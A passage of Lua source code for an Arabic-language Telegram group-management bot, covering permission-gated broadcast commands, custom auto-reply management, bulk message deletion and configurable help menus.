photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(list) do 
sendPhoto(v, 0, 0, 1, nil, photo,(msg.content_.caption_ or ''))
end 
elseif msg.content_.animation_ then
for k,v in pairs(list) do 
sendDocument(v, 0, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ''))    
end 
elseif msg.content_.sticker_ then
for k,v in pairs(list) do 
sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
end end
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙تم اذاعه رسالتك بنجاح \n✟︙الى ، ❨ "..#list.." ❩ مشترك \n ", 1, 'md')
KASPERdx1:del(KASPER.."Send:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end
--     By Developer KASPER     -- 
if text == "اذاعه" and msg.reply_to_message_id_ == 0 and is_leader(msg) or text == " اذاعه عام" and msg.reply_to_message_id_ == 0 and is_leader(msg) then 
KASPERdx1:setex(KASPER.."Send:Gp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
local KASPER = '✟︙اهلا عزيزي ، '..renk_KASPER(msg)..'\n✟︙ارسل لي سواء \n✟︙❨ ملصق ، متحركه ، صوره ، رساله ❩ \nللخروج ارسل ،  ( الغاء ) \n '
KASPERdx( msg.chat_id_, msg.id_, 1, KASPER, 1, "md") 
return false
end 
if KASPERdx1:get(KASPER.."Send:Gp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙تم الغاء امر الاذاعه ،", 1, 'md')
KASPERdx1:del(KASPER.."Send:Gp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end 
list = KASPERdx1:smembers(KASPER..'bot:groups') 
if msg.content_.text_ then
for k,v in pairs(list) do 
KASPERdx(v, 0, 1, '['..msg.content_.text_..']', 1, 'md')
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(list) do 
sendPhoto(v, 0, 0, 1, nil, photo,(msg.content_.caption_ or ''))
end 
elseif msg.content_.animation_ then
for k,v in pairs(list) do 
sendDocument(v, 0, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ''))    
end 
elseif msg.content_.sticker_ then
for k,v in pairs(list) do 
sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
end end
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙تم اذاعه رسالتك بنجاح \n✟︙الى ، ❨ "..#list.." ❩ مجموعه \n ", 1, 'md')
KASPERdx1:del(KASPER.."Send:Gp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end
--     By Developer KASPER     -- 
if text == "اذاعه بالتوجيه" and msg.reply_to_message_id_ == 0 and is_leader(msg) or text == "↫ اذاعه عام بالتوجيه ⌁" and msg.reply_to_message_id_ == 0 and is_leader(msg) then 
KASPERdx1:setex(KASPER.."Send:FwdGp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
local KASPER = '✟︙اهلا عزيزي ، '..renk_KASPER(msg)..'\n✟︙ارسل الرساله الان لتوجيهها\nللخروج ارسل ،  ( الغاء ) \n '
KASPERdx( msg.chat_id_, msg.id_, 1, KASPER, 1, "md") 
return false
end 
if KASPERdx1:get(KASPER.."Send:FwdGp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙تم الغاء امر الاذاعه ،", 1, 'md')
KASPERdx1:del(KASPER.."Send:FwdGp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false  
end 
local list = KASPERdx1:smembers(KASPER..'bot:groups')   
for k,v in pairs(list) do  
tdcli_function({ID="ForwardMessages",
chat_id_ = v,
from_chat_id_ = msg.chat_id_,
message_ids_ = {[0] = msg.id_},
disable_notification_ = 0,
from_background_ = 1},function(a,t) end,nil) 
end   
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙تم اذاعه رسالتك بالتوجيه \n✟︙في ، ❨ "..#list.." ❩ مجموعه \n ", 1, 'md')
KASPERdx1:del(KASPER.."Send:FwdGp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end
--     By Developer KASPER     -- 
if text == "اذاعه خاص بالتوجيه" and msg.reply_to_message_id_ == 0 and is_leader(msg) or text == "↫ اذاعه خاص بالتوجيه ⌁" and msg.reply_to_message_id_ == 0 and is_leader(msg) then 
KASPERdx1:setex(KASPER.."Send:FwdPv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
local KASPER = '✟︙اهلا عزيزي ، '..renk_KASPER(msg)..'\n✟︙ارسل الرساله الان لتوجيهها\nللخروج ارسل ،  ( الغاء ) \n '
KASPERdx( msg.chat_id_, msg.id_, 1, KASPER, 1, "md") 
return false
end 
if KASPERdx1:get(KASPER.."Send:FwdPv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙تم الغاء امر الاذاعه ،", 1, 'md')
KASPERdx1:del(KASPER.."Send:FwdPv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false  
end 
local list = KASPERdx1:smembers(KASPER..'bot:userss')   
for k,v in pairs(list) do  
tdcli_function({ID="ForwardMessages",
chat_id_ = v,
from_chat_id_ = msg.chat_id_,
message_ids_ = {[0] = msg.id_},
disable_notification_ = 0,
from_background_ = 1},function(a,t) end,nil) 
end   
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙تم اذاعه رسالتك بالتوجيه \n✟︙الى ، ❨ "..#list.." ❩ مشترك \n ", 1, 'md')
KASPERdx1:del(KASPER.."Send:FwdPv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end 
--     By Developer KASPER     --  
text = msg.content_.text_
if msg.content_.text_ == 'حذف رد' and is_owner(msg.sender_user_id_, msg.chat_id_) and KASPER11(msg) or msg.content_.text_ == 'مسح رد' and  is_owner(msg.sender_user_id_, msg.chat_id_) and KASPER11(msg) then
KASPERdx1:set(KASPER..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'','del_repgp1')
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙حسننا ارسل الكلمة لحذفها " ,  1, "md")
return false
end
if msg.content_.text_ then
local content_text = KASPERdx1:get(KASPER..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'')
if content_text == 'del_repgp1' then
KASPERdx(msg.chat_id_, msg.id_, 1,'✟︙الكلمه ،*('..msg.content_.text_..')* تم حذفها ',  1, "md")
KASPERdx1:del(KASPER..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'')
KASPERdx1:del(KASPER..'gif_repgp'..msg.content_.text_..''..msg.chat_id_..'')
KASPERdx1:del(KASPER..'voice_repgp'..msg.content_.text_..''..msg.chat_id_..'')
KASPERdx1:del(KASPER..'audio_repgp'..msg.content_.text_..''..msg.chat_id_..'')
KASPERdx1:del(KASPER..'photo_repgp'..msg.content_.text_..''..msg.chat_id_..'')
KASPERdx1:del(KASPER..'stecker_repgp'..msg.content_.text_..''..msg.chat_id_..'')
KASPERdx1:del(KASPER..'video_repgp'..msg.content_.text_..''..msg.chat_id_..'')
KASPERdx1:del(KASPER..'file_repgp'..msg.content_.text_..''..msg.chat_id_..'')
KASPERdx1:del(KASPER..'text_repgp'..msg.content_.text_..''..msg.chat_id_..'')
KASPERdx1:srem(KASPER..'rep_owner'..msg.chat_id_..'',msg.content_.text_)
return false end end
--     By Developer KASPER     -- 
if msg.content_.text_ == 'اضف رد' and is_owner(msg.sender_user_id_, msg.chat_id_) and KASPER11(msg) then
KASPERdx1:set(KASPER..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'','set_repgp')
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙حسننا ارسل الكلمه الان " ,  1, "md")
return false    end
if msg.content_.text_ then
local content_KASPERdx12 = KASPERdx1:get(KASPER..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'')
if content_KASPERdx12 == 'set_repgp' then
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙ارسل لي الرد سواء كان : \n✟︙❨ ملف ، ملصق ، متحركه ، صوره\n ، فيديو ، بصمه ، صوت ، رساله ❩\n✟︙يمكنك اضافه الى النص : \n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n- `#username`  معرف المستخدم\n- `#msgs`  عدد الرسائل\n- `#name`  اسم المستخدم\n- `#id`  ايدي المستخدم\n- `#stast`  رتبه المستخدم\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n✟︙للخروج ارسل  ( الغاء )\n " ,  1, "md")
KASPERdx1:set(KASPER..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'','save_repgp')
KASPERdx1:set(KASPER..'addreplaygp:'..msg.sender_user_id_..''..msg.chat_id_..'',msg.content_.text_)
KASPERdx1:sadd(KASPER..'rep_owner'..msg.chat_id_..'',msg.content_.text_)
KASPERdx1:set(KASPER..'delrep_owner'..msg.chat_id_..'',msg.content_.text_)
return false
end end
text = msg.content_.text_
if msg.content_.text_ == 'حذف رد عام' and is_sudo(msg) or msg.content_.text_ == 'مسح رد عام' and is_sudo(msg) or msg.content_.text_ == 'مسح رد للكل' and is_sudo(msg) then
KASPERdx1:set(KASPER.."add:repallt"..msg.sender_user_id_,'del_rep1')
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙حسننا ارسل الكلمة لحذفها " ,  1, "md")
return false
end
if msg.content_.text_ then
local content_text = KASPERdx1:get(KASPER.."add:repallt"..msg.sender_user_id_)
if content_text == 'del_rep1' then
KASPERdx(msg.chat_id_, msg.id_, 1,'✟︙الكلمه ،*('..msg.content_.text_..')* تم حذفها ',  1, "md")
KASPERdx1:del(KASPER.."add:repallt"..msg.sender_user_id_)
KASPERdx1:del(KASPER.."gif_repall"..msg.content_.text_)
KASPERdx1:del(KASPER.."voice_repall"..msg.content_.text_)
KASPERdx1:del(KASPER.."audio_repall"..msg.content_.text_)
KASPERdx1:del(KASPER.."photo_repall"..msg.content_.text_)
KASPERdx1:del(KASPER.."stecker_repall"..msg.content_.text_)
KASPERdx1:del(KASPER.."video_repall"..msg.content_.text_)
KASPERdx1:del(KASPER.."file_repall"..msg.content_.text_)
KASPERdx1:del(KASPER.."text_repall"..msg.content_.text_)
KASPERdx1:del(KASPER.."rep_sudo",msg.content_.text_)
return false
end end 
--     By Developer KASPER     -- 
if msg.content_.text_ == 'اضف رد عام' and is_sudo(msg) or msg.content_.text_ == 'اضف رد للكل' and is_sudo(msg)  then
KASPERdx1:set(KASPER.."add:repallt"..msg.sender_user_id_,'set_rep')
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙حسننا ارسل الكلمه الان " ,  1, "md")
return false    end
if msg.content_.text_ then
local content_KASPERdx12 = KASPERdx1:get(KASPER.."add:repallt"..msg.sender_user_id_)
if content_KASPERdx12 == 'set_rep' then
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙ارسل لي الرد سواء كان : \n✟︙❨ ملف ، ملصق ، متحركه ، صوره\n ، فيديو ، بصمه ، صوت ، رساله ❩\n✟︙يمكنك اضافه الى النص : \n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n- `#username`  معرف المستخدم\n- `#msgs`  عدد الرسائل\n- `#name`  اسم المستخدم\n- `#id`  ايدي المستخدم\n- `#stast`  رتبه المستخدم\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n✟︙للخروج ارسل  ( الغاء )\n " ,  1, "md")
KASPERdx1:set(KASPER.."add:repallt"..msg.sender_user_id_,'save_rep')
KASPERdx1:set(KASPER.."addreply2:"..msg.sender_user_id_, msg.content_.text_)
KASPERdx1:sadd(KASPER.."rep_sudo",msg.content_.text_)
KASPERdx1:set(KASPER.."delrep_sudo",msg.content_.text_)
return false 
end end
--     By Developer KASPER     -- 
if msg.content_.text_ == 'الردود' and is_owner(msg.sender_user_id_, msg.chat_id_) and KASPER11(msg) or msg.content_.text_ == 'ردود المدير' and is_owner(msg.sender_user_id_, msg.chat_id_) and KASPER11(msg) then
local redod = KASPERdx1:smembers(KASPER..'rep_owner'..msg.chat_id_..'')
if #redod == 0 then
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙لا توجد ردود مضافه" ,  1, "md")
else
msg_rep = "✟︙ردود المدراء ⬇️،\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n"
for k,v in pairs(redod) do
if KASPERdx1:get(KASPER.."gif_repgp"..v..msg.chat_id_) then
dp = 'متحركه 🎭'
elseif KASPERdx1:get(KASPER.."voice_repgp"..v..msg.chat_id_) then
dp = 'بصمه 🎙'
elseif KASPERdx1:get(KASPER.."stecker_repgp"..v..msg.chat_id_) then
dp = 'ملصق 🃏'
elseif KASPERdx1:get(KASPER.."text_repgp"..v..msg.chat_id_) then
dp = 'رساله ✉'
elseif KASPERdx1:get(KASPER.."photo_repgp"..v..msg.chat_id_) then
dp = 'صوره 🎇'
elseif KASPERdx1:get(KASPER.."video_repgp"..v..msg.chat_id_) then
dp = 'فيديو 📽'
elseif KASPERdx1:get(KASPER.."file_repgp"..v..msg.chat_id_) then
dp = 'ملف 📁'
elseif KASPERdx1:get(KASPER.."audio_repgp"..v..msg.chat_id_) then
dp = 'اغنيه 🎶'
end
msg_rep = msg_rep ..k..' - (*'..v..'*) « » (*'..dp..'*)\n' 
end
KASPERdx(msg.chat_id_, msg.id_, 1, msg_rep,1, 'md')
end
return false
end
--     By Developer KASPER     -- 
if msg.content_.text_ == 'حذف الردود' and is_owner(msg.sender_user_id_, msg.chat_id_) and KASPER11(msg) or msg.content_.text_ == 'مسح الردود' and is_owner(msg.sender_user_id_, msg.chat_id_) and KASPER11(msg) or msg.content_.text_ == 'حذف ردود المدير' and is_owner(msg.sender_user_id_, msg.chat_id_) and KASPER11(msg) or msg.content_.text_ == 'مسح ردود المدير' and is_owner(msg.sender_user_id_, msg.chat_id_) and KASPER11(msg) then
local redod = KASPERdx1:smembers(KASPER..'rep_owner'..msg.chat_id_..'')
if #redod == 0 then
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙لا توجد ردود مضافه" ,  1, "md")
else
for k,v in pairs(redod) do
KASPERdx1:del(KASPER..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'')
KASPERdx1:del(KASPER..'gif_repgp'..v..msg.chat_id_)
KASPERdx1:del(KASPER..'voice_repgp'..v..msg.chat_id_)
KASPERdx1:del(KASPER..'audio_repgp'..v..msg.chat_id_)
KASPERdx1:del(KASPER..'photo_repgp'..v..msg.chat_id_)
KASPERdx1:del(KASPER..'stecker_repgp'..v..msg.chat_id_)
KASPERdx1:del(KASPER..'video_repgp'..v..msg.chat_id_)
KASPERdx1:del(KASPER..'file_repgp'..v..msg.chat_id_)
KASPERdx1:del(KASPER..'text_repgp'..v..msg.chat_id_)
KASPERdx1:del(KASPER..'rep_owner'..msg.chat_id_..'',msg.content_.text_)
end
local KASPER = '✟︙اهلا عزيزي ،  '..renk_KASPER(msg)..' \n✟︙تم حذف ردود المدير\n'
KASPERdx( msg.chat_id_, msg.id_, 1, KASPER, 1, "md") 
return false
end end 
--     By Developer KASPER     -- 
if  msg.content_.text_ == "ردود المطور" and is_sudo(msg) or msg.content_.text_ == "الردود العام" and is_sudo(msg) or msg.content_.text_ == "ردود العام" and is_sudo(msg) then
local redod = KASPERdx1:smembers(KASPER.."rep_sudo")
if #redod == 0 then
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙لا توجد ردود مضافه" ,  1, "md")
else
local i = 1
msg_rep = "✟︙ردود المطور ⬇️،\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n"
for k,v in pairs(redod) do
if KASPERdx1:get(KASPER.."gif_repall"..v) then
dp = 'متحركه 🎭'
elseif KASPERdx1:get(KASPER.."voice_repall"..v) then
dp = 'بصمه 🎙'
elseif KASPERdx1:get(KASPER.."stecker_repall"..v) then
dp = 'ملصق 🃏'
elseif KASPERdx1:get(KASPER.."text_repall"..v) then
dp = 'رساله ✉'
elseif KASPERdx1:get(KASPER.."photo_repall"..v) then
dp = 'صوره 🎇'
elseif KASPERdx1:get(KASPER.."video_repall"..v) then
dp = 'فيديو 📽'
elseif KASPERdx1:get(KASPER.."file_repall"..v) then
dp = 'ملف 📁'
elseif KASPERdx1:get(KASPER.."audio_repall"..v) then
dp = 'اغنيه 🎶'
end
msg_rep = msg_rep ..k..' - (*'..v..'*) « » (*'..dp..'*)\n' 
end
KASPERdx(msg.chat_id_, msg.id_, 1, msg_rep,1, "md")
end
return false
end
--     By Developer KASPER     -- 
if msg.content_.text_ == "حذف ردود المطور" and is_sudo(msg) or msg.content_.text_ == "حذف ردود العام" and is_sudo(msg) or msg.content_.text_ == "مسح ردود المطور" and is_sudo(msg) then
local redod = KASPERdx1:smembers(KASPER.."rep_sudo")
if #redod == 0 then
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙لا توجد ردود مضافه" ,  1, "md")
else
for k,v in pairs(redod) do
KASPERdx1:del(KASPER.."add:repallt"..v)
KASPERdx1:del(KASPER.."gif_repall"..v)
KASPERdx1:del(KASPER.."voice_repall"..v)
KASPERdx1:del(KASPER.."audio_repall"..v)
KASPERdx1:del(KASPER.."photo_repall"..v)
KASPERdx1:del(KASPER.."stecker_repall"..v)
KASPERdx1:del(KASPER.."video_repall"..v)
KASPERdx1:del(KASPER.."file_repall"..v)
KASPERdx1:del(KASPER.."text_repall"..v)
KASPERdx1:del(KASPER.."rep_sudo",msg.content_.text_)
end
local KASPER = '✟︙اهلا عزيزي ،  '..renk_KASPER(msg)..' \n✟︙تم حذف ردود المطور\n'
KASPERdx( msg.chat_id_, msg.id_, 1, KASPER, 1, "md") 
return false
end end end
--     By Developer KASPER     -- 
if text and text:match("^تغيير اسم البوت$") or text:match("^وضع اسم البوت$") then
if not is_leader(msg) then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙للمطور الاساسي فقط ', 1, 'md')
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙ارسل لي اسم البوت الان ', 1, 'html')
KASPERdx1:set('KASPER:'..bot_id..'namebot'..msg.sender_user_id_..'', 'msg')
return false 
end end
--     By Developer KASPER     -- 
if text and text == 'مسح اسم البوت' then
if not is_leader(msg) then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙للمطور الاساسي فقط ', 1, 'md')
else
KASPERdx1:del('KASPER:'..bot_id..'name_bot')
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم حذف اسم البوت ', 1, 'html')
end end 
--     By Developer KASPER     -- 
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text and text:match('^تنظيف (%d+)$') and KASPER11(msg) then    
local Number = tonumber(text:match('^تنظيف (%d+)$')) 
if Number > 1000 then 
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙لا تستطيع تنظيف اكثر من 1000 رساله ', 1, 'md')
return false  
end  
local Message = msg.id_
for i=1,tonumber(Number) do
delete_msg(msg.chat_id_,{[0]=Message})
Message = Message - 1048576 
end
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم مسح * '..Number..'* رساله ', 1, 'md')
end 
if text and text:match('^مسح (%d+)$') and KASPER11(msg) then    
local Number = tonumber(text:match('^مسح (%d+)$')) 
if Number > 1000 then 
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙لا تستطيع تنظيف اكثر من 1000 رساله ', 1, 'md')
return false  
end  
local Message = msg.id_
for i=1,tonumber(Number) do
delete_msg(msg.chat_id_,{[0]=Message})
Message = Message - 1048576 
end
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم مسح * '..Number..'* رساله ', 1, 'md')
end end
--     By Developer KASPER     -- 
if is_leader(msg) and text:match("^استعاده الاوامر$") then
KASPERdx1:del(KASPER..'bot:help', text)
KASPERdx1:del(KASPER..'bot:help1', text)
KASPERdx1:del(KASPER..'bot:help2', text)
KASPERdx1:del(KASPER..'bot:help3', text) 
KASPERdx1:del(KASPER..'bot:help4', text)
KASPERdx1:del(KASPER..'bot:help5', text) 
KASPERdx1:del(KASPER..'bot:help6', text) 
KASPERdx1:del(KASPER..'bot:help7', text) 
KASPERdx1:del(KASPER..'bot:help8', text) 
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙تم استعاده الكلايش الاصليه " ,  1, "md")
end
--     By Developer KASPER     -- 
if is_leader(msg) and text:match("^تعيين الاوامر$") then
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙ارسل لي الكليشه الان " ,  1, "md")
KASPERdx1:set(KASPER..'bot:help0'..msg.sender_user_id_..'', 'msg')
return false end
if text:match("^(.*)$") then
local KASPER =  KASPERdx1:get(KASPER..'bot:help0'..msg.sender_user_id_..'')
if KASPER == 'msg' then
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙تم حفظ الكليشه الجديده " ,  1, "md")
KASPERdx1:set(KASPER..'bot:help0'..msg.sender_user_id_..'', 'no')
KASPERdx1:set(KASPER..'bot:help', text)
KASPERdx(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
--     By Developer KASPER     -- 
if text:match("^الاوامر$") and KASPER11(msg) then
local help = KASPERdx1:get(KASPER..'bot:help')
local text =  [[
         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •
✟︙اليك اوامر البوت ↓↓
         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •
✟︙ارسل (م1) لعرض اوامر الحماية
✟︙ارسل (م2) لعرض اوامر المشرفين
✟︙ارسل (م3) لعرض اوامر الخدمة
✟︙ارسل (م4) لعرض اوامر الوضع
✟︙ارسل (م5) لعرض اوامر الرفع والتنزيل
✟︙ارسل (م6) لعرض اوامر التفعيلات
✟︙ارسل (م7) لعرض اوامر مسح القوائم
✟︙ارسل (م8) لعرض اوامر المطورين
         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •
✟︙مطور البوت : @]]..SudoKASPER..[[

✟︙قناة السورس : @KASPER_ch
]] 
KASPERdx(msg.chat_id_, msg.id_, 1, (help or text), 1, 'html') 
end 
--     By Developer KASPER     -- 
if is_leader(msg) and text:match("^تعيين امر م1$") then
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙ارسل لي الكليشه الان " ,  1, "md")
KASPERdx1:set(KASPER..'bot:help01'..msg.sender_user_id_..'', 'msg')
return false end
if text:match("^(.*)$") then
local KASPER =  KASPERdx1:get(KASPER..'bot:help01'..msg.sender_user_id_..'')
if KASPER == 'msg' then 
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙تم حفظ الكليشه الجديده " ,  1, "md")
KASPERdx1:set(KASPER..'bot:help01'..msg.sender_user_id_..'', 'no')
KASPERdx1:set(KASPER..'bot:help1', text)
KASPERdx(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
--     By Developer KASPER     -- 
if text:match("^م1$") or  text:match("^م١$") and KASPER11(msg) then 
local help = KASPERdx1:get(KASPER..'bot:help1')
local text =  [[
✟︙اوامر الحمايه
         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •
✟︙قفل « » فتح
         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •
✟︙الروابط
✟︙المـعـرف
✟︙البوتات
✟︙الشارحه
✟︙المتحركه
✟︙الملفات
✟︙الفيديو
✟︙الاونلاين
✟︙الدردشه
✟︙التوجيه
✟︙الاغاني
✟︙الصوت
✟︙الجهات
✟︙الماركداون
✟︙العربيه
         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •
✟︙النكليزيه
✟︙الحمايه
✟︙التكرار
✟︙الهاشتاك
✟︙التعديل
✟︙التثبيت
✟︙الاشعارات
✟︙الكل
✟︙الكلايش
✟︙الشبكات
✟︙المواقع
✟︙الفشار
✟︙الكفران
✟︙الطائفيه
✟︙الفارسيه 
✟︙الفارسيه بالطرد
✟︙البوتات بالطرد
✟︙البوتات بالتقييد
          • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •
✟︙الكل بالساعات + عدد الساعات
           • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •
✟︙مطور البوت : @]]..SudoKASPER..[[

✟︙قناة السورس : @KASPER_ch
]]
KASPERdx(msg.chat_id_, msg.id_, 1, (help or text), 1, 'html')
end 
--     By Developer KASPER     -- 
if is_leader(msg) and text:match("^تعيين امر م2$") and KASPER11(msg) then
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙ارسل لي الكليشه الان " ,  1, "md")
KASPERdx1:set(KASPER..'bot:help21'..msg.sender_user_id_..'', 'msg')
return false end
if text:match("^(.*)$") then
local KASPER =  KASPERdx1:get(KASPER..'bot:help21'..msg.sender_user_id_..'')
if KASPER == 'msg' then
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙تم حفظ الكليشه الجديده " ,  1, "md")
KASPERdx1:set(KASPER..'bot:help21'..msg.sender_user_id_..'', 'no')
KASPERdx1:set(KASPER..'bot:help2', text)
KASPERdx(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
--     By Developer KASPER     -- 
if text:match("^م2$") or text:match("^م٢$") and KASPER11(msg) then
local help = KASPERdx1:get(KASPER..'bot:help2')
local text =  [[
✟︙اوامر المشرفين
         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •
✟︙اوامر المسح والحظر والتقيد
        • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •
✟︙طرد 
✟︙مسح الكل 
✟︙حظر « » الغاء حظر
✟︙كتم  « » الغاء كتم 
✟︙تقييد « » الغاء التقييد
✟︙كشف القيود « » رفع القيود
        • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •
✟︙كتم د + عدد الدقائق 
✟︙كتم س + عدد الساعات 
✟︙كتم ي + عدد الايام
✟︙الطريقه الوحيده لالغاء الكتم بالوقت
                                    ↓↓
✟︙اعدادات المجموعه » الصلاحيات »
           » للاسفل » خيارات » حذف من هذه القائمه 
         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •
✟︙اوامر اخرى
         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •
✟︙نزلني
✟︙فحص  
✟︙اضف رد 
✟︙مسح رد 
✟︙اضف امر 
✟︙مسح امر 
✟︙اضف صلاحيه 
✟︙مسح صلاحيه 
✟︙مسح الردود 
✟︙تنظيف الميديا
✟︙منو ضافني
✟︙ضع قوانين
✟︙ضع وصف
✟︙ضع ترحيب
✟︙جلب الترحيب 
✟︙حذف الترحيب  
✟︙معلومات المجموعه 
✟︙طرد الحسابات المحذوفه 
✟︙تنظيف قائمه الحظر 
         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •
✟︙منع « » الغاء منع 
✟︙تثبيت « » الغاء التثبيت 
✟︙كلمه all + الكليشه
✟︙مسح   + العدد 
✟︙ايدي   + المعرف 
✟︙اضافه + معرف العضو 
✟︙اضف رسائل  + الايدي 
✟︙تغير رد المطور + الرد
✟︙تغير رد منشئ الاساسي + الرد
✟︙تغير رد المنشئ + الرد
✟︙تغير رد المدير + الرد
✟︙تغير رد الادمن + الرد
✟︙تغير رد المميز + الرد
✟︙تغير رد العضو + الرد
✟︙مسح ردود الرتب
         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •
✟︙قوائم اخرى

✟︙المنشئين الاساسيين
✟︙الدعم « » قائمه المنع 
✟︙الردود « » المحظورين 
✟︙المدراء « » الاعدادات 
✟︙الادمنيه « » المكتومين 
✟︙المطايه « »   المنشئين  
✟︙المقيدين « » الاعضاء المميزين 
✟︙الصلاحيات « » الاوامر المضافه
         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •
✟︙مطور البوت : @]]..SudoKASPER..[[

✟︙قناة السورس : @KASPER_ch
]]
KASPERdx(msg.chat_id_, msg.id_, 1, (help or text), 1, 'html')
end 
--     By Developer KASPER     -- 
if is_leader(msg) and text:match("^تعيين امر م3$") and KASPER11(msg) then
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙ارسل لي الكليشه الان " ,  1, "md")
KASPERdx1:set(KASPER..'bot:help31'..msg.sender_user_id_..'', 'msg')
return false end
if text:match("^(.*)$") then
local KASPER =  KASPERdx1:get(KASPER..'bot:help31'..msg.sender_user_id_..'')
if KASPER == 'msg' then
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙تم حفظ الكليشه الجديده " ,  1, "md")
KASPERdx1:set(KASPER..'bot:help31'..msg.sender_user_id_..'', 'no')
KASPERdx1:set(KASPER..'bot:help3', text)
KASPERdx(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end 
--     By Developer KASPER     -- 
if text:match("^م3$") or text:match("^م٣$") and KASPER11(msg) then
local help = KASPERdx1:get(KASPER..'bot:help3')
local text =  [[
✟︙اوامر الخدمة 
         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •
✟︙الابراج
✟︙اهمس
✟︙الوقت 
✟︙زخرفه  
✟︙الرابط 
✟︙موقعي 
✟︙جهاتي 
✟︙نقاطي 
✟︙اطردني
✟︙صورتي
✟︙رسائلي 
